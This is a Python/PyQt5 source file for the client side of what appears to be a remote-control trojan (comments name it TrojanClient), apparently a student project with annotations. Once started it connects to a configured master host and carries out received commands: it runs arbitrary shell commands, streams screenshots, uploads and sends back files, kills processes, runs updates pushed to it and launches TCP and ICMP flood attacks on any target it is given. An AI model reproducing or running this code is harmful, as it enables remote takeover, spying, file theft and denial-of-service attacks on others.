from PyQt5.QtCore import pyqtSignal, QObject, Qt, QThread, QMutex, QWaitCondition
from PyQt5.QtGui import QCursor
from PyQt5.QtWidgets import QMenu, QWidget, QApplication, QListWidgetItem, QAction, QCheckBox, QLabel, QMessageBox
import client
from clientUIDefinition import Ui_MainWindow
import sys
from threading import Thread
import configparser
import json
import os
import socket
import struct
import sys
import psutil
from PIL import ImageGrab, Image
from Attacker import Attacker
import platform
import subprocess
import time
from queue import Queue
from FileExplorer import FileExplorer
from ThreadExplorer import ThreadExplorer
import random

flag_judge = False
flag_thread = False
config = configparser.ConfigParser()
config.read('config.ini', 'utf8')
master_ip = config.get('client', 'masterIp')

def restart_program():
    print("正在重启...")
    python = sys.executable
    os.execl(python, python, *sys.argv)


def update(filename):
    print("正在升级")
    os.system(filename)
    exit(0)


def judgelang():
    os = platform.system()  # 获取操作系统的类型
    if os == "Windows":
        lang = "GBK"
    else:
        lang = "UTF-8"
    return lang


class UdpPacket:
    type = ''
    content = ''
    pstPort = ''
    pstIP = ''


def get_host_ip():
    """
    查询本机ip地址
    :return: ip
    """
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((master_ip, 8088))
        ip = s.getsockname()[0]
    finally:
        if s:
            s.close()
    return ip

class ClientMain(QWidget, Ui_MainWindow):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.bind()

    def bind(self):
        self.pushButton.clicked.connect(self.startMain)

    def startMain(self):
        reply = QMessageBox.question(self, '提示', '确定被控吗?',QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

        if reply == QMessageBox.Yes:
            self.pushButton.setText('正被管理')
            self.pushButton.setEnabled(False)
            self.cal = clientThread()
            self.cal.ipsiganal.connect(self.setip)
            self.cal.threadsignal.connect(self.threadcrtlbox)
            self.cal.start()
            # thread = Thread(target=client.mainStart)
            # thread.start()
            # thread.join()
        else:
            pass

    def setip(self,ipmessage):
        self.iplabel.setText(ipmessage)

    def threadcrtlbox(self,mes):
        global flag_thread
        print(mes)
        reply = QMessageBox.question(self, '提示', '是否接受进程控制?',QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            flag_thread = True
        else:
            pass
        self.cal.resume()


# class clientThread(QThread):
#     ipsiganal = pyqtSignal(str)
#     threadsignal = pyqtSignal(str)
#     def __init__(self):
#         super().__init__()
#         self.cond = QWaitCondition()
#         self.mutex = QMutex()
#     def run(self):
#         global flag_judge
#         port = 13400
#         i = 0
#         # while i <= 32:
#         #     port += i
#         #     try:
#         self.trojanServer = TrojanClient(int(port))#初始化
#         self.trojanServer.searchMaster()
#         ipmessage = "控制端ip:"+str(self.trojanServer.masterIP)+" 本机ip:"+str(self.trojanServer.ownip)+" 管理udp端口:"+str(self.trojanServer.masterUdpPort)+" 管理tcp端口"+str(self.trojanServer.masterTcpPort)+" 本机udp服务端口:"+ str(self.trojanServer.udpRecvPort)
#         self.ipsiganal.emit(ipmessage)
#         while True:
#             self.mutex.lock()
#             if flag_judge == False:
#                 trojanServer.searchMaster()
#                 time.sleep(60)
#             else:
#                 flag_judge = False
#                 self.threadsignal.emit("judge")
#             self.mutex.unlock()

        #         self.udpPort = udpPort #
        # self.udpRecvPort = udpPort + 1 #受控端udp接收端口
        # self.masterIP = master_ip #控制端ip
        # self.masterUdpPort = config.getint('client', 'masterUdpPort') #此端口与控制端udp接收端口相同
        # self.masterTcpPort = config.getint('client', 'masterTcpPort') #此端口与控制端tcp端口相同
        # self.ownip = get_host_ip() #获取了自己的ip，受控端ip
                # while True:
                #     trojanServer.searchMaster()
                #     time.sleep(60)
            # except:
            #     print("error")
            # finally:
            #     i += 4


class clientThread(QThread):
    ipsiganal = pyqtSignal(str)
    threadsignal = pyqtSignal(str)
    def __init__(self):
        super().__init__()
        self.cond = QWaitCondition()
        self.mutex = QMutex()
        # configs
        
    def run(self):
        global flag_judge
        self.udpPort = 13400 #
        self.udpRecvPort = self.udpPort + 1 #受控端udp接收端口
        self.masterIP = master_ip #控制端ip
        self.masterUdpPort = config.getint('client', 'masterUdpPort') #此端口与控制端udp接收端口相同
        self.masterTcpPort = config.getint('client', 'masterTcpPort') #此端口与控制端tcp端口相同
        self.ownip = get_host_ip() #获取了自己的ip，受控端ip
        print(self.ownip)
        # ipmessage = "控制端ip:"+str(self.masterIP)+" 本机ip:"+str(self.ownip)+" 管理udp端口:"+str(self.masterUdpPort)+" 管理tcp端口"+str(self.masterTcpPort)+" 本机udp服务端口:"+ str(self.udpRecvPort)
        # print(ipmessage)
        # self.ipsiganal.emit(ipmessage)
        self.cwd = os.getcwd() #当前工作目录
        #print("initialization1")
        self.fileExplorer = FileExplorer() #初始化一个list，是当前目录下所有文件的，但还没有调用，是通过一个exec函数调用的
        #print("initialization2")
        self.threadExplorer = ThreadExplorer()
        self.p = None
        
        self.enableRun = True
        self.realCmdQ = Queue()
        self.commandThread = Thread(target=self.cmdRecv) #判断os，然后到run_command
        self.commandThread.daemon = True
        self.commandThread.start()#dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
        self.udpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #真正开始建socket连接
        self.udpSocket.bind((self.ownip, self.udpPort)) #ip绑定了自己的ip， udpPort是那个初始化来回试探的

        self.udpRecvSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udpRecvSocket.bind((self.ownip, self.udpRecvPort)) #这里好像看出了问题，为什么都是ownip呢

        self.tcpSocket = None

        self.udpQ = Queue()
        self.udpS = Thread(target=self.udpSend, daemon=True) #发送线程
        self.udpR = Thread(target=self.udpRecv, daemon=True) #接收线程
        self.udpS.start()#dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
        self.udpR.start()#dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd


        self.tcpSQ = Queue()
        self.tcpS = Thread(target=self.RealtcpSend, daemon=True) #暂时没看出来tcp怎么用的
        self.tcpS.start()#dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
        self.enablePic = True
        self.picTime = 5  # 每张截图时间间隔为 picTime * 0.05

        self.picThread = None
        self.width = 672

        self.attacker = Attacker()
        while 1:
            search = random.randint(0,11)
            if search == 10:
                self.searchMaster()
            ipmessage = "控制端ip:"+str(self.masterIP)+" 本机ip:"+str(self.ownip)+" 管理udp端口:"+str(self.masterUdpPort)+" 管理tcp端口"+str(self.masterTcpPort)+" 本机udp服务端口:"+ str(self.udpRecvPort)
            self.ipsiganal.emit(ipmessage)
            if flag_judge == False:
                time.sleep(1)
            else:
                flag_judge = False
                self.threadsignal.emit("judge")

    def resume(self):
        self.cond.wakeAll()

    def cmdRecv(self):
        while True:
            cmd = self.realCmdQ.get()
            lang = judgelang()
            if lang == "Linux":
                cmd = cmd.encode("UTF-8")
            try:
                thread = Thread(target=self.run_command, args=(cmd, lang))
                thread.start()
            except:
                self.tcpSend("response", "Command Error")

    def tcpPieceSend(self, data, socket, size=1024):
        dsize = 0
        data_len = len(data)
        while dsize + size <= data_len:
            socket.send(data[dsize: dsize + size])
            dsize += size
        if dsize < data_len:
            socket.send(data[dsize:])

    def RealtcpSend(self):
        while True:
            print("正在获取tcp发送包")
            q = self.tcpSQ.get()
            cmd = q['cmd']
            data = q['data']
            print("已取得, 正在发送:", cmd)
            if not self.tcpSocket:
                return
            try:
                self.tcpSocket.send(struct.pack('i', len(cmd.encode("utf8"))))
                self.tcpSocket.send(cmd.encode("utf8"))
                if cmd == "pic":
                    imd = data.tobytes()
                    img_len = len(imd)
                    self.tcpSocket.send(struct.pack('iii', *data.size, img_len))
                    self.tcpPieceSend(imd, self.tcpSocket, 1024)

                elif cmd == "response":
                    self.tcpSocket.send(struct.pack('i', len(data.encode("utf8"))))
                    self.tcpSocket.send(data.encode("utf8"))

                elif cmd == "filelist":
                    self.tcpSocket.send(struct.pack('i', len(data)))
                    self.tcpPieceSend(data, self.tcpSocket, 1024)

                elif cmd == "threadlist":
                    self.tcpSocket.send(struct.pack('i', len(data)))
                    self.tcpPieceSend(data, self.tcpSocket, 1024)
                    print("finish sending threadlist")

                elif cmd == "file":
                    length = os.path.getsize(data)
                    self.tcpSocket.send(struct.pack('i', length))
                    with open(data, 'rb') as file:
                        while True:
                            d = file.read(1024)
                            if not d:
                                break
                            self.tcpPieceSend(d, self.tcpSocket, 1024)
            except:
                print("控制端断开")

    def tcpSend(self, cmd, data=None):
        self.tcpSQ.put({
            'cmd': cmd,
            'data': data
        })


    def tcpPieceRecv(self, length, socket, size=1024):
        dsize = 0
        body = b''
        while dsize + size < length:
            piece = socket.recv(size)
            body += piece
            dsize += len(piece)
        body += socket.recv(length - dsize)
        return body

    def saveFiles(self, socket, file_name, size):
        try:
            data = self.tcpPieceRecv(size, socket, 1024)
            with open(file_name, 'wb') as file:
                file.write(data)
                self.tcpSend("response", "传输完成")
        except Exception as e:
            self.tcpSend("response", str(e))
            self.tcpSend("response", "文件上传失败")

    def udpSend(self):
        print("UDP 发送器已启动")
        while True:
            udpPacket = self.udpQ.get()#这是一个队列，存储了控制端发来的信息
            print("发送UDP数据包: %s" % udpPacket.content.decode('utf8'))
            if udpPacket.type == 'send':#在我阅读代码后感觉send都是由控制端那边发来的命令
                self.udpSocket.sendto(udpPacket.content, (self.masterIP, self.masterUdpPort))#这个发送给的是主机对了
            elif udpPacket.type == 'close':
                print("UDP 发送器已停止")
                break

    def udpRecv(self):
        global flag_judge
        global flag_thread
        print("udp 接收器已启动")
        while True:
            data, addr = self.udpRecvSocket.recvfrom(1024) #recv看起来正常，一直接收udp发来的东西，然后判端功能
            print("Received from %s:%d  --> %s" % (addr, self.udpPort, data.decode('utf8')))
            allcmd = data.decode('utf8').split(' ')
            cmd = allcmd[0]
            if cmd == 'find':
                udpPacket = UdpPacket()
                udpPacket.type = 'send'
                udpPacket.content = 'find'.encode('utf8')
                self.udpQ.put(udpPacket)
            elif cmd == 'connect':
                self.tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    self.tcpSocket.connect((self.masterIP, self.masterTcpPort))
                except:
                    self.tcpSocket.close()
                    self.tcpSocket = None
            elif cmd == 'disconnect':
                if self.tcpSocket:
                    self.tcpSocket.close()
                    self.tcpSocket = None
            elif cmd == 'tcpFlood':
                # dst_ip  port start end
                self.attacker.enableStop = False
                self.attacker.allFlood(*allcmd[1:])
            elif cmd == 'icmpFlood':
                self.attacker.enableStop = False
                self.attacker.icmpAttack(allcmd[1])
            elif cmd == 'floodStop':
                self.attacker.enableStop = True
            elif cmd == 'pic':
                self.enablePic = True
                self.sendPic(disposable=True)
            elif cmd == 'picstart':
                self.enablePic = True
                if not self.picThread:
                    self.picThread = Thread(target=self.sendPic, daemon=True)
                    self.picThread.start()
            elif cmd == "picstop":
                self.enablePic = False
                self.picThread = None
            elif cmd == "set":
                if allcmd[1] == "pictime":
                    self.picTime = int(allcmd[2])
                elif allcmd[1] == "picwidth":
                    self.width = int(allcmd[2])
            elif cmd == 'upload':
                filename = allcmd[1]
                size = int(allcmd[2])
                print(filename)
                self.saveFiles(self.tcpSocket, filename, size)
            elif cmd == 'getFile':
                filename = allcmd[1]
                full = os.path.join(os.getcwd(), filename)
                self.tcpSend("file", full)
            elif cmd == 'DeleteThread':
                threadpid = allcmd[1]
                print("delete the thread which pid =", end = ' ')
                print(threadpid)
                pid = psutil.Process(int(threadpid))
                pid.terminate()
            elif cmd == "update":
                try:
                    if self.tcpSocket:
                        self.tcpSocket.close()
                    if self.udpSocket:
                        self.udpSocket.close()
                    if self.udpRecvSocket:
                        self.udpRecvSocket.close()
                except Exception as e:
                    print(e)
                update(allcmd[1])
            elif cmd == 'dos':
                if allcmd[1] == 'restart':
                    restart_program()
                    return
                if allcmd[1] == 'terminate':
                    self.enableRun = False
                    continue
                elif allcmd[1] == 'cd':
                    try:
                        os.chdir(allcmd[2])
                    except:
                        print("权限不足")
                    self.cwd = os.getcwd()
                    self.enableRun = True
                    self.realCmdQ.put('echo %s' % self.cwd)
                    self.transportList()
                else:
                    self.enableRun = True
                    self.realCmdQ.put(' '.join(allcmd[1:]))

            elif cmd == "ls":
                self.transportList()
            
            elif cmd == "thread":#dddddddddddddddddddneed QmessageBox.Question
                self.mutex.lock()
                flag_judge = True
                self.cond.wait(self.mutex)
                if flag_thread == True:
                    print("Start thread control")
                    self.thransportThread()
                else:
                    pass
                self.mutex.unlock()


    def thransportThread(self):
        self.threadExplorer.getList()
        data = json.dumps(self.threadExplorer.Process_message)
        self.tcpSend(cmd="threadlist", data=data.encode('utf8'))

    def transportList(self):
        self.fileExplorer.getList()
        data = json.dumps({'list': self.fileExplorer.list, 'pwd': os.getcwd()})
        self.tcpSend(cmd="filelist", data=data.encode('utf8'))

    def sendPic(self, disposable=False):
        while self.enablePic:
            print("...", end='')
            im = ImageGrab.grab()
            im = im.resize((self.width, int(im.size[1] * self.width / im.size[0])), Image.ANTIALIAS)
            self.tcpSend(cmd='pic', data=im)
            time.sleep(self.picTime * 0.05)
            if disposable:
                break

    def searchMaster(self):
        udpPacket = UdpPacket() #udp数据报格式
        udpPacket.type = 'send' #send竟然是这边发送
        udpPacket.content = 'find'.encode('utf8') #内容是find
        self.udpQ.put(udpPacket) #放进了自己的队列？

    def run_command(self, command, lang):
        command = command.rstrip()
        print("the command is", command)
        try:
            if not self.enableRun:
                if self.p:
                    self.p.terminate()
                    return
            self.p = subprocess.Popen(command, bufsize=48, shell=True, close_fds=True, stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=self.cwd)
            # poll()判断是否执行完毕，执行完毕返回0，未执行完毕返回None
            while self.p.poll() is None and self.enableRun:
                line = self.p.stdout.readline()
                line = line.strip()
                if line:
                    # 将输出的结果实时打印，并且转换编码格式
                    # print('Subprogram output: [{}]'.format(line.decode(lang)))
                    self.tcpSend("response", line.decode(lang))
            # if self.p.returncode == 0:
            #     print('Subprogram success')
            # else:
            #     print('Subprogram failed')

        except Exception as e:
            self.tcpSend("response", str(e))


if __name__ == '__main__':
    app = QApplication(sys.argv)
    MainWin = ClientMain()
    MainWin.show()
    sys.exit(app.exec_())